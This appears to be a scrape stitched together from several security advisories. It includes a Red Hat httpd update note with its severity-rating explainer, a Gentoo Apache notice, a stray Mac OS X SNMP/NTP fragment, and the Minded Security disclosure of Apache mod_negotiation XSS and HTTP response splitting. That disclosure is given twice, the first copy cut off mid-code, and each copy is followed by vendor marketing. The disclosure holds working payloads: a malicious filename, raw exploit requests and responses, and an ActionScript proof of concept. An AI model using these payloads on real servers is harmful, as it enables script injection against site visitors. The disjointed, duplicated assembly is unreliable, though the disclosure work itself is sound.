## Topic

Updated httpd packages that fix multiple security issues, various bugs,
and add enhancements are now available for Red Hat Enterprise Linux 5.

The Red Hat Security Response Team has rated this update as having low
security impact. Common Vulnerability Scoring System (CVSS) base scores,
which give detailed severity ratings, are available for each vulnerability
from the CVE links in the References section.

## Description

The httpd packages contain the Apache HTTP Server (httpd), which is the
namesake project of The Apache Software Foundation.

Input sanitization flaws were found in the mod\_negotiation module. A remote
attacker able to upload or create files with arbitrary names in a directory
that has the MultiViews options enabled, could use these flaws to conduct
cross-site scripting and HTTP response splitting attacks against users
visiting the site. (CVE-2008-0455, CVE-2008-0456, CVE-2012-2687)

Bug fixes:

* Previously, no check was made to see if the

/etc/pki/tls/private/localhost.key file was a valid key prior to running
the "%post" script for the "mod\_ssl" package. Consequently, when
/etc/pki/tls/certs/localhost.crt did not exist and "localhost.key" was
present but invalid, upgrading the Apache HTTP Server daemon (httpd) with
mod\_ssl failed. The "%post" script has been fixed to test for an existing
SSL key. As a result, upgrading httpd with mod\_ssl now proceeds as
expected. (BZ#752618)

* The "mod\_ssl" module did not support operation under FIPS mode.

Consequently, when operating Red Hat Enterprise Linux 5 with FIPS mode
enabled, httpd failed to start. An upstream patch has been applied to
disable non-FIPS functionality if operating under FIPS mode and httpd now
starts as expected. (BZ#773473)

* Prior to this update, httpd exit status codes were not Linux Standard

Base (LSB) compliant. When the command "service httpd reload" was run and
httpd failed, the exit status code returned was "0" and not in the range 1
to 6 as expected. A patch has been applied to the init script and httpd now
returns "1" as an exit status code. (BZ#783242)

* Chunked Transfer Coding is described in RFC 2616. Previously, the

Apache server did not correctly handle a chunked encoded POST request with
a "chunk-size" or "chunk-extension" value of 32 bytes or more.
Consequently, when such a POST request was made the server did not respond.
An upstream patch has been applied and the problem no longer occurs.
(BZ#840845)

* Due to a regression, when mod\_cache received a non-cacheable 304

response, the headers were served incorrectly. Consequently, compressed
data could be returned to the client without the cached headers to indicate
the data was compressed. An upstream patch has been applied to merge
response and cached headers before data from the cache is served to the
client. As a result, cached data is now correctly interpreted by the
client. (BZ#845532)

* In a proxy configuration, certain response-line strings were not handled

correctly. If a response-line without a "description" string was received
from the origin server, for a non-standard status code, such as the "450"
status code, a "500 Internal Server Error" would be returned to the client.
This bug has been fixed so that the original response line is returned to
the client. (BZ#853128)

Enhancements:

* The configuration directive "LDAPReferrals" is now supported in addition

to the previously introduced "LDAPChaseReferrals". (BZ#727342)

* The AJP support module for "mod\_proxy", "mod\_proxy\_ajp", now supports the

"ProxyErrorOverride" directive. Consequently, it is now possible to
configure customized error pages for web applications running on a backend
server accessed via AJP. (BZ#767890)

* The "%posttrans" scriptlet which automatically restarts the httpd service

after a package upgrade can now be disabled. If the file
/etc/sysconfig/httpd-disable-posttrans exists, the scriptlet will not
restart the daemon. (BZ#833042)

* The output of "httpd -S" now includes configured alias names for each

virtual host. (BZ#833043)

* New certificate variable names are now exposed by "mod\_ssl" using the

"\_DN\_userID" suffix, such as "SSL\_CLIENT\_S\_DN\_userID", which use the
commonly used object identifier (OID) definition of "userID", OID
0.9.2342.19200300.100.1.1. (BZ#840036)

All users of httpd are advised to upgrade to these updated packages, which
fix these issues and add these enhancements.

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

  Available for: Mac OS X v10.4.11, Mac OS X Server v10.4.11, Mac OS X v10.5 through v10.5.6, Mac OS X Server v10.5 through v10.5.6

  Impact: A remote attacker may terminate the operation of the SNMP service

  Description: An integer overflow exists in the netsnmp\_create\_subtree\_cache function. By sending a maliciously crafted SNMPv3 packet, an attacker may cause the SNMP server to terminate, denying service to legitimate clients. This update addresses the issue by applying the Net-SNMP patches on Mac OS X v10.4.11 systems, and by updating net\_snmp to version 5.4.2.1 on Mac OS X v10.5.x systems. The SNMP service is not enabled by default on Mac OS X or Mac OS X Server.

* **Network Time**

  CVE-ID: CVE-2009-0021

  Available for: Mac OS X v10.4.11, Mac OS X Server v10.4.11, Mac OS X v10.5 through v10.5.6, Mac OS X Server v10.5 through v10.5.6

  Impact: Network Time is susceptible to a spoofing attack if NTP authentication is enabled

  Description: The ntpd daemon incorrectly checks the return value of the OpenSSL EVP\_VerifyFinal function. On systems using NTPv4 authentication, this may allow a maliciously crafted signature to bypass the cryptographic signature validation, which may lead to a time spoofing attack. By default, NTP authentication is not enabled. This update addresses the issue by properly checking the return value of the EVP\_VerifyFinal function.

* **Network Time**

# Apache: Multiple vulnerabilities — GLSA **200803-19**

Multiple vulnerabilities have been discovered in Apache.

### Affected packages

| Package | **www-servers/apache** on all architectures |
| --- | --- |
| Affected versions | < **2.2.8** |
| Unaffected versions | >= **2.2.8** |

### Background

The Apache HTTP server is one of the most popular web servers on the
Internet.

### Description

Adrian Pastor and Amir Azam (ProCheckUp) reported that the HTTP Method
specifier header is not properly sanitized when the HTTP return code is
"413 Request Entity too large" (CVE-2007-6203). The mod\_proxy\_balancer
module does not properly check the balancer name before using it
(CVE-2007-6422). The mod\_proxy\_ftp does not define a charset in its
answers (CVE-2008-0005). Stefano Di Paola (Minded Security) reported
that filenames are not properly sanitized within the mod\_negotiation
module (CVE-2008-0455, CVE-2008-0456).

### Impact

A remote attacker could entice a user to visit a malicious URL or send
specially crafted HTTP requests (i.e using Adobe Flash) to perform
Cross-Site Scripting and HTTP response splitting attacks, or conduct a
Denial of Service attack on the vulnerable web server.

### Workaround

There is no known workaround at this time.

### Resolution

All Apache users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-servers/apache-2.2.8"
```

Apache mod\_negotiation Xss and Http Response Splitting
Date: January 22th, 2008
Tested Versions: Apache <=1.3.39
<= 2.0.61
<= 2.2.6
Minded Security ReferenceID:
MSA01150108
Credits:
Discovery by
Stefano Di Paola of Minded Security
stefano.dipaola [\_at\_] mindedsecurity.com
Severity: Low/Medium
Permalink:
http://www.mindedsecurity.com/MSA01150108.html
[ Background ]
>From Apache Mod\_Negotiation page:
Content negotiation, or more accurately content selection,
is the selection of the document that best matches the clients
capabilities, from one of several available documents. There are
two implementations of this.
\* A type map (a file with the handler type-map) which explicitly
lists the files containing the variants.
\* A MultiViews search (enabled by the MultiViews Option, where the
server does an implicit filename pattern match, and choose from
amongst the results.
[ Summary ]
Mod\_negotiation doesn't sanitize filenames in '406 Not Acceptable'
response and '300 Multiple Choices' message body.
This could lead to Xss if the name of the file is controlled by an
attacker (i.e. by previously uploading it).
Moreover, as the list of the filenames is also sent, without being
sanitized, in the response header, it could result in a Http Response
Splitting [1] issue if the name of the file contains '\n' (Line Feed).
[ Analysis ]
I. Cross Site Scripting
Let's suppose mod\_negotiation is enabled and an attacker could upload
a file with arbitrary name and whatever mime extension.
For example a legit jpeg file named:
<img src=sa onerror=eval(document.location.hash.substr(1))>.jpg
Then by requesting it without extension with Accept header set to
image/jpeg; q=0,
----------------------------------------------------
GET <img%20src=sa%20onerror=eval(document.location.hash.substr(1))>
HTTP/1.1
Host: 127.0.0.1
Accept: image/jpeg; q=0
HTTP/1.1 406 Not Acceptable
Date: Tue, 15 Jan 2008 15:43:11 GMT
Server: Apache/2.0.55 (Ubuntu) PHP/5.1.6
Alternates: {"<img src=sa
onerror=eval(document.location.hash.substr(1))>.jpg" 1 {type image/jpeg}
{length 2}}
Vary: negotiate
TCN: list
Content-Length: 610
Content-Type: text/html; charset=iso-8859-1
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>406 Not Acceptable</title>
</head><body>
<h1>Not Acceptable</h1>
<p>An appropriate representation of the requested resource /<img
src=sa
onerror=eval(document.location.hash.substr(1))> could not be found
on
this server.</p>
Available variants:
<ul>
<li><a href="<img src=sa
onerror=eval(document.location.hash.substr(1))>.jpg">
<img src=sa onerror=eval(document.location.hash.substr(1))>.jpg</a> ,
type image/jpeg</li>
</ul>
<hr>
-----------------------------------------------------
As it could be noted, no sanitization of the filename is done,
leading to Xss.
II. Http Response Splitting
By using a similar technique, Http Response Splitting could be
triggered if there's some way to set the name of the file like
the following:
'junk
Header: Injected
blah:.jpg'
Then, by requesting the urlencoded file name:
------------------------------------------------------
GET /junk%0aHeader:%20Injected%0ablah: HTTP/1.1
Host: 127.0.0.1
Accept: image/jpeg; q=0
HTTP/1.1 406 Not Acceptable
Date: Tue, 15 Jan 2008 16:06:52 GMT
Server: Apache/2.0.55 (Ubuntu) PHP/5.1.6
Alternates: {"junk
Header: Injected <----- Here!
blah:.jpg" 1 {type image/jpeg} {length 2}}
Vary: negotiate
TCN: list
Content-Length: 508
Content-Type: text/html; charset=iso-8859-1
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>406 Not Acceptable</title>
</head><body>
<h1>Not Acceptable</h1>
<p>An appropriate representation of the requested resource /junk
Header: Injected
blah: could not be found on this server.</p>
Available variants:
<ul>
<li><a href="junk
Header: Injected
blah:.jpg">junk
Header: Injected
blah:.jpg</a> , type image/jpeg</li>
</ul>
<hr>
<address>Apache/2.0.55 (Ubuntu) PHP/5.1.6 Server at 127.0.0.1 Port
80</address>
</body></html>
------------------------------------------------------
As it could be noted, the header response is splitted and "Header:
Injected" is,
indeed injected.
[ Proof of Concept ]
The following actionscript can be used in order to trigger the Xss.
----------------------------------------------------------
// Tested on IE 7 and FF 2.0.11, Flash plugin 9.0 r115
// Compile with flex compiler
package
{
import flash.display.Sprite;
import flash.net.\*
public class TestXss extends flash.display.Sprite {
public function TestXss(){
var r:URLRequest = new URLRequest('http://victim/<img%20src=sa%
20onerror=eval(document.location.hash.substr(1))>#alert(123)');
r.method = 'POST';
r.data = unescape('test');
r.requestHeaders.push(new URLRequestHeader('Accept', 'image/jpeg;

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Apache mod\_negotiation Xss and Http Response Splitting.

##### **Affected Versions:**

Apache <=1.3.39

<= 2.0.61

<= 2.2.6

##### **Minded Security ReferenceID:**

MSA01150108

##### **Credits:**

Discovered by

Stefano Di Paola of Minded Security

stefano.dipaola [\_at\_] mindedsecurity.com

##### **Reference:**

MSA01150108

##### **Severity:**

Low/Medium

##### **Background**

>From Apache Mod\_Negotiation page:

Content negotiation, or more accurately content selection, is the selection of the document that best matches the clients capabilities, from one of several available documents. There are two implementations of this.

\* A type map (a file with the handler type-map) which explicitly

lists the files containing the variants.

\* A MultiViews search (enabled by the MultiViews Option, where the

server does an implicit filename pattern match, and choose from

amongst the results.

##### **Summary**

Mod\_negotiation doesn’t sanitize filenames in ‘406 Not Acceptable’ response and ‘300 Multiple Choices’ message body.

This could lead to Xss if the name of the file is controlled by an attacker (i.e. by previously uploading it).

Moreover, as the list of the filenames is also sent, without being sanitized, in the response header, it could result in a Http Response Splitting [

1] issue if the name of the file contains ‘\n’ (Line Feed).

##### **Analysis**

I. Cross Site Scripting

Let’s suppose mod\_negotiation is enabled and an attacker could upload a file with arbitrary name and whatever mime extension.

For example a legit jpeg file named:

```

<img src=sa onerror=eval(document.location.hash.substr(1))>.jpg

Then by requesting it without extension with Accept header set to image/jpeg; q=0,

----------------------------------------------------

GET <img%20src=sa%20onerror=eval(document.location.hash.substr(1))> HTTP/1.1
Host: 127.0.0.1
Accept: image/jpeg; q=0

HTTP/1.1 406 Not Acceptable
Date: Tue, 15 Jan 2008 15:43:11 GMT
Server: Apache/2.0.55 (Ubuntu) PHP/5.1.6
Alternates: {"<img src=sa
onerror=eval(document.location.hash.substr(1))>.jpg" 1 {type image/jpeg} {length 2}}
Vary: negotiate
TCN: list
Content-Length: 610
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>406 Not Acceptable</title>
</head><body>
<h1>Not Acceptable</h1>
<p>An appropriate representation of the requested resource /<img
src=sa
onerror=eval(document.location.hash.substr(1))> could not be found
on
this server.</p>

```

Available variants:

```

<ul>
<li><a href="<img src=sa
onerror=eval(document.location.hash.substr(1))>.jpg">
<img src=sa onerror=eval(document.location.hash.substr(1))>.jpg</a> ,
type image/jpeg</li>
</ul>

<hr>

-----------------------------------------------------

```

As it could be noted, no sanitization of the filename is done, leading to Xss.

II. Http Response Splitting

By using a similar technique, Http Response Splitting could be triggered if there’s some way to set the name of the file like the following:

```

'junk
Header: Injected
blah:.jpg'

Then, by requesting the urlencoded file name:

------------------------------------------------------
GET /junk%0aHeader:%20Injected%0ablah: HTTP/1.1
Host: 127.0.0.1
Accept: image/jpeg; q=0

HTTP/1.1 406 Not Acceptable
Date: Tue, 15 Jan 2008 16:06:52 GMT
Server: Apache/2.0.55 (Ubuntu) PHP/5.1.6
Alternates: {"junk
Header: Injected <----- Here!
blah:.jpg" 1 {type image/jpeg} {length 2}}
Vary: negotiate
TCN: list
Content-Length: 508
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>406 Not Acceptable</title>

</head><body>
<h1>Not Acceptable</h1>
<p>An appropriate representation of the requested resource /junk
Header: Injected
blah: could not be found on this server.</p>
Available variants:
<ul>
<li><a href="junk
Header: Injected
blah:.jpg">junk
Header: Injected
blah:.jpg</a> , type image/jpeg</li>

</ul>
<hr>
<address>Apache/2.0.55 (Ubuntu) PHP/5.1.6 Server at 127.0.0.1 Port
80</address>
</body></html>

------------------------------------------------------

```

As it could be noted, the header response is splitted and “Header: Injected” is, indeed injected.

Proof of Concept

The following actionscript can be used in order to trigger the Xss.

```

----------------------------------------------------------
// Tested on IE 7 and FF 2.0.11, Flash plugin 9.0 r115
// Compile with flex compiler
package
{
import flash.display.Sprite;
import flash.net.*
public class TestXss extends flash.display.Sprite {
public function TestXss(){
var r:URLRequest = new URLRequest('http://victim/<img%20src=sa%20
onerror=eval(document.location.hash.substr(1))>#alert(123)');

r.method = 'POST';
r.data = unescape('test');
r.requestHeaders.push(new URLRequestHeader('Accept', 'image/jpeg; q=0'));

navigateToURL(r, '_self');

}
}
}
----------------------------------------------------------

```

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
